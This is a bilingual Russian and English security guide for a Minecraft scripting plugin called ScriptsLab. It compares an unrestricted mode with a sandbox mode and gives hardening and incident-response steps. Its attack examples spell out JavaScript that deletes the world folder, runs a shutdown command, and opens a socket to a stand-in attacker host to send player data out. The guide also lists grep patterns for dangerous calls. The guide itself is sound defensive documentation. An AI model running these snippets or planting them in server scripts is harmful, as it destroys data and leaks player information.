# ScriptsLab - Безопасность

## ⚠️ Важно!

ScriptsLab предоставляет мощный скриптовый движок, который может выполнять JavaScript код на вашем сервере. **Неправильная конфигурация может привести к проблемам безопасности!**

## Режимы работы

### 🔓 Unrestricted Mode (Без ограничений)

**Когда использовать:**
- Личный сервер
- Вы единственный, кто пишет скрипты
- Полное доверие ко всем администраторам

**Возможности:**
- ✅ Полный доступ к Java API
- ✅ Чтение/запись файлов
- ✅ Сетевые запросы
- ✅ Выполнение системных команд
- ✅ Доступ к Reflection API

**Настройка:**
```yaml
security:
  sandbox-enabled: false
```

**⚠️ Риски:**
- Скрипты могут удалить файлы сервера
- Скрипты могут выполнить системные команды
- Скрипты могут украсть данные
- Скрипты могут остановить сервер

### 🔒 Sandbox Mode (Песочница)

**Когда использовать:**
- Публичный сервер
- Несколько администраторов
- Не доверяете всем скриптам

**Ограничения:**
- ❌ Нет доступа к файловой системе
- ❌ Нет сетевых запросов
- ❌ Нет системных команд
- ✅ Только безопасные Bukkit/Paper API
- ✅ Только разрешённые Java классы

**Настройка:**
```yaml
security:
  sandbox-enabled: true
  allowed-packages:
    - org.bukkit
    - net.kyori
    - java.util
    - java.lang
```

**Что можно:**
- ✅ Работа с игроками
- ✅ Работа с миром
- ✅ События Bukkit
- ✅ Команды
- ✅ Кастомные предметы

**Что нельзя:**
- ❌ `new java.io.File()`
- ❌ `Runtime.getRuntime().exec()`
- ❌ `new java.net.Socket()`
- ❌ Reflection API

## Текущая конфигурация

По умолчанию ScriptsLab работает в **Unrestricted Mode** для удобства разработки.

**Для продакшена рекомендуется включить Sandbox Mode!**

## Примеры атак (что может пойти не так)

### Атака 1: Удаление файлов

```javascript
// В unrestricted mode это сработает!
var File = Java.type('java.io.File');
var worldFolder = new File('world');
worldFolder.delete(); // Удалит мир!
```

**Защита:** Sandbox mode блокирует `java.io.File`

### Атака 2: Выполнение команд

```javascript
// В unrestricted mode это сработает!
var Runtime = Java.type('java.lang.Runtime');
Runtime.getRuntime().exec('shutdown -s -t 0'); // Выключит сервер!
```

**Защита:** Sandbox mode блокирует `java.lang.Runtime`

### Атака 3: Кража данных

```javascript
// В unrestricted mode это сработает!
var Socket = Java.type('java.net.Socket');
var socket = new Socket('attacker.com', 1337);
// Отправка данных игроков злоумышленнику
```

**Защита:** Sandbox mode блокирует `java.net.*`

### Атака 4: Бесконечный цикл

```javascript
// Это сработает в любом режиме!
while(true) {
    // Заморозит сервер
}
```

**Защита:** Таймаут выполнения (настраивается в config.yml)

## Рекомендации по безопасности

### 1. Используйте Sandbox Mode на публичных серверах

```yaml
security:
  sandbox-enabled: true
```

### 2. Ограничьте права на папку скриптов

```bash
# Linux
chmod 700 plugins/ScriptsLab/scripts/
chown minecraft:minecraft plugins/ScriptsLab/scripts/

# Windows
# Настройте права через свойства папки
```

### 3. Проверяйте скрипты перед загрузкой

```bash
# Проверьте на опасные паттерны
grep -r "Runtime.getRuntime" scripts/
grep -r "java.io.File" scripts/
grep -r "java.net.Socket" scripts/
```

### 4. Используйте таймауты

```yaml
scripts:
  timeout: 5000  # 5 секунд максимум
```

### 5. Ограничьте память

```yaml
scripts:
  max-memory: 128  # 128 MB на скрипт
```

### 6. Логируйте всё

```yaml
general:
  debug: true  # Включить подробное логирование
```

### 7. Регулярно проверяйте логи

```bash
# Ищите подозрительную активность
grep "Script" logs/latest.log
grep "ERROR" logs/latest.log
```

### 8. Используйте права доступа

```yaml
# В plugin.yml
permissions:
  scriptslab.script:
    description: Управление скриптами
    default: op  # Только операторы
```

### 9. Делайте резервные копии

```bash
# Регулярно бэкапьте сервер
tar -czf backup-$(date +%Y%m%d).tar.gz world/ plugins/
```

### 10. Обновляйте плагин

Следите за обновлениями ScriptsLab для получения патчей безопасности.

## Что делать при взломе

### 1. Немедленно остановите сервер

```bash
stop
```

### 2. Проверьте скрипты

```bash
# Найдите подозрительные скрипты
find plugins/ScriptsLab/scripts/ -type f -mtime -1
```

### 3. Проверьте логи

```bash
# Найдите подозрительную активность
grep -i "error\|exception\|failed" logs/latest.log
```

### 4. Удалите подозрительные скрипты

```bash
rm plugins/ScriptsLab/scripts/suspicious_script.js
```

### 5. Включите Sandbox Mode

```yaml
security:
  sandbox-enabled: true
```

### 6. Смените пароли

Смените пароли от:
- FTP/SFTP
- Панели управления
- Базы данных
- Операторских аккаунтов

### 7. Восстановите из бэкапа

Если повреждения серьёзные - восстановите сервер из резервной копии.

## Проверка безопасности

### Тест 1: Попытка доступа к файлам

```javascript
// Этот скрипт должен УПАСТЬ в sandbox mode
var File = Java.type('java.io.File');
Console.log('File access: ' + (File !== undefined));
```

**Ожидаемый результат в sandbox mode:**
```
ReferenceError: Java is not defined
```

### Тест 2: Попытка выполнения команд

```javascript
// Этот скрипт должен УПАСТЬ в sandbox mode
var Runtime = Java.type('java.lang.Runtime');
Runtime.getRuntime().exec('echo test');
```

**Ожидаемый результат в sandbox mode:**
```
ReferenceError: Java is not defined
```

### Тест 3: Доступ к Bukkit API

```javascript
// Этот скрипт должен РАБОТАТЬ в sandbox mode
var Material = Java.type('org.bukkit.Material');
Console.log('Bukkit access: OK');
```

**Ожидаемый результат в sandbox mode:**
```
[ScriptsLab] [Script] Bukkit access: OK
```

## Сравнение режимов

| Функция | Unrestricted | Sandbox |
|---------|-------------|---------|
| Bukkit API | ✅ | ✅ |
| Команды | ✅ | ✅ |
| События | ✅ | ✅ |
| Кастомные предметы | ✅ | ✅ |
| Файловая система | ✅ | ❌ |
| Сетевые запросы | ✅ | ❌ |
| Системные команды | ✅ | ❌ |
| Reflection API | ✅ | ❌ |
| Произвольные Java классы | ✅ | ❌ |

## FAQ

### Q: Нужен ли мне Sandbox Mode?

**A:** Да, если:
- У вас публичный сервер
- Несколько человек имеют доступ к скриптам
- Вы не доверяете всем скриптам на 100%

**Нет, если:**
- Это ваш личный сервер
- Только вы пишете скрипты
- Вам нужен полный доступ к Java API

### Q: Можно ли обойти Sandbox?

**A:** Теоретически - да, если найдена уязвимость в GraalVM. Но это очень сложно и маловероятно.

### Q: Влияет ли Sandbox на производительность?

**A:** Минимально. Проверка прав доступа добавляет ~1-2% накладных расходов.

### Q: Можно ли разрешить конкретные классы в Sandbox?

**A:** Да, добавьте их в `allowed-packages` в config.yml:

```yaml
security:
  allowed-packages:
    - org.bukkit
    - com.mycompany.api
```

### Q: Что делать, если скрипт не работает в Sandbox?

**A:** Либо:
1. Переписать скрипт без опасных операций
2. Добавить нужные классы в `allowed-packages`
3. Отключить Sandbox (не рекомендуется)

## Заключение

**Для разработки:** Используйте Unrestricted Mode  
**Для продакшена:** Используйте Sandbox Mode

**Золотое правило:** Если сомневаетесь - включайте Sandbox!

---

**Безопасность - это не опция, это необходимость! 🔒**

---

# ScriptsLab - Security

## ⚠️ Important!

ScriptsLab provides a powerful script engine that executes JavaScript code on your server. **Improper configuration can lead to security issues!**

## Operation Modes

### 🔓 Unrestricted Mode (No restrictions)

**When to use:**
- Personal server
- You are the only script writer
- Full trust to all administrators

**Capabilities:**
- ✅ Full Java API access
- ✅ File read/write
- ✅ Network requests
- ✅ Execute system commands
- ✅ Reflection API access

**Configuration:**
```yaml
security:
  sandbox-enabled: false
```

**⚠️ Risks:**
- Scripts can delete server files
- Scripts can execute system commands
- Scripts can steal data
- Scripts can shutdown server

### 🔒 Sandbox Mode (Sandbox)

**When to use:**
- Public server
- Multiple administrators
- Don't trust all scripts

**Restrictions:**
- ❌ No file system access
- ❌ No network requests
- ❌ No system commands
- ✅ Only safe Bukkit/Paper API
- ✅ Only allowed Java classes

**Configuration:**
```yaml
security:
  sandbox-enabled: true
  allowed-packages:
    - org.bukkit
    - net.kyori
    - java.util
    - java.lang
```

**What's allowed:**
- ✅ Player management
- ✅ World management
- ✅ Bukkit events
- ✅ Commands
- ✅ Custom items

**What's forbidden:**
- ❌ `new java.io.File()`
- ❌ `Runtime.getRuntime().exec()`
- ❌ `new java.net.Socket()`
- ❌ Reflection API

## Current Configuration

By default, ScriptsLab runs in **Unrestricted Mode** for development convenience.

**For production, it's recommended to enable Sandbox Mode!**

## Attack Examples (What can go wrong)

### Attack 1: File Deletion

```javascript
// In unrestricted mode this works!
var File = Java.type('java.io.File');
var worldFolder = new File('world');
worldFolder.delete(); // Deletes the world!
```

**Protection:** Sandbox mode blocks `java.io.File`

### Attack 2: Command Execution

```javascript
// In unrestricted mode this works!
var Runtime = Java.type('java.lang.Runtime');
Runtime.getRuntime().exec('shutdown -s -t 0'); // Shuts down server!
```

**Protection:** Sandbox mode blocks `java.lang.Runtime`

### Attack 3: Data Theft

```javascript
// In unrestricted mode this works!
var Socket = Java.type('java.net.Socket');
var socket = new Socket('attacker.com', 1337);
// Sends player data to attacker
```

**Protection:** Sandbox mode blocks `java.net.*`

### Attack 4: Infinite Loop

```javascript
// This works in any mode!
while(true) {
    // Freezes server
}
```

**Protection:** Execution timeout (configurable in config.yml)

## Security Recommendations

### 1. Use Sandbox Mode on public servers

```yaml
security:
  sandbox-enabled: true
```

### 2. Restrict script folder permissions

```bash
# Linux
chmod 700 plugins/ScriptsLab/scripts/
chown minecraft:minecraft plugins/ScriptsLab/scripts/

# Windows
# Set folder permissions through properties
```

### 3. Verify scripts before loading

```bash
# Check for dangerous patterns
grep -r "Runtime.getRuntime" scripts/
grep -r "java.io.File" scripts/
grep -r "java.net.Socket" scripts/
```

### 4. Use timeouts

```yaml
scripts:
  timeout: 5000  # 5 seconds max
```

### 5. Limit memory

```yaml
scripts:
  max-memory: 128  # 128MB per script
```

### 6. Log everything

```yaml
general:
  debug: true  # Enable verbose logging
```

### 7. Regularly check logs

```bash
# Look for suspicious activity
grep "Script" logs/latest.log
grep "ERROR" logs/latest.log
```

### 8. Use access permissions

```yaml
# In plugin.yml
permissions:
  scriptslab.script:
    description: Manage scripts
    default: op  # Only operators
```

### 9. Make backups regularly

```bash
# Regularly backup server
tar -czf backup-$(date +%Y%m%d).tar.gz world/ plugins/
```

### 10. Update plugin

Follow ScriptsLab updates to get security patches.

## What to do if compromised

### 1. Immediately stop the server

```bash
stop
```

### 2. Check scripts

```bash
# Find suspicious scripts
find plugins/ScriptsLab/scripts/ -type f -mtime -1
```

### 3. Check logs

```bash
# Find suspicious activity
grep -i "error\|exception\|failed" logs/latest.log
```

### 4. Delete suspicious scripts

```bash
rm plugins/ScriptsLab/scripts/suspicious_script.js
```

### 5. Enable Sandbox Mode

```yaml
security:
  sandbox-enabled: true
```

### 6. Change passwords

Change passwords for:
- FTP/SFTP
- Control panels
- Databases
- Operator accounts

### 7. Restore from backup

If damage is severe - restore server from backup.

## Security Testing

### Test 1: File access attempt

```javascript
// This script should FAIL in sandbox mode
var File = Java.type('java.io.File');
Console.log('File access: ' + (File !== undefined));
```

**Expected result in sandbox mode:**
```
ReferenceError: Java is not defined
```

### Test 2: Command execution attempt

```javascript
// This script should FAIL in sandbox mode
var Runtime = Java.type('java.lang.Runtime');
Runtime.getRuntime().exec('echo test');
```

**Expected result in sandbox mode:**
```
ReferenceError: Java is not defined
```

### Test 3: Bukkit API access

```javascript
// This script should WORK in sandbox mode
var Material = Java.type('org.bukkit.Material');
Console.log('Bukkit access: OK');
```

**Expected result in sandbox mode:**
```
[ScriptsLab] [Script] Bukkit access: OK
```

## Mode Comparison

| Feature | Unrestricted | Sandbox |
|---------|-------------|---------|
| Bukkit API | ✅ | ✅ |
| Commands | ✅ | ✅ |
| Events | ✅ | ✅ |
| Custom Items | ✅ | ✅ |
| File System | ✅ | ❌ |
| Network Requests | ✅ | ❌ |
| System Commands | ✅ | ❌ |
| Reflection API | ✅ | ❌ |
| Arbitrary Java Classes | ✅ | ❌ |

## FAQ

### Q: Do I need Sandbox Mode?

**A:** Yes, if:
- You have a public server
- Multiple people have script access
- You don't trust all scripts 100%

**No, if:**
- It's your personal server
- You are the only script writer
- You need full Java API access

### Q: Can Sandbox be bypassed?

**A:** Theoretically - yes, if a GraalVM vulnerability is found. But it's very difficult and unlikely.

### Q: Does Sandbox affect performance?

**A:** Minimally. Access check adds ~1-2% overhead.

### Q: Can I allow specific classes in Sandbox?

**A:** Yes, add them to `allowed-packages` in config.yml:

```yaml
security:
  allowed-packages:
    - org.bukkit
    - com.mycompany.api
```

### Q: What to do if script doesn't work in Sandbox?

**A:** Either:
1. Rewrite script without dangerous operations
2. Add needed classes to `allowed-packages`
3. Disable Sandbox (not recommended)

## Conclusion

**For development:** Use Unrestricted Mode  
**For production:** Use Sandbox Mode

**Golden rule:** When in doubt - enable Sandbox!

---

**Security is not an option, it's a necessity! 🔒**
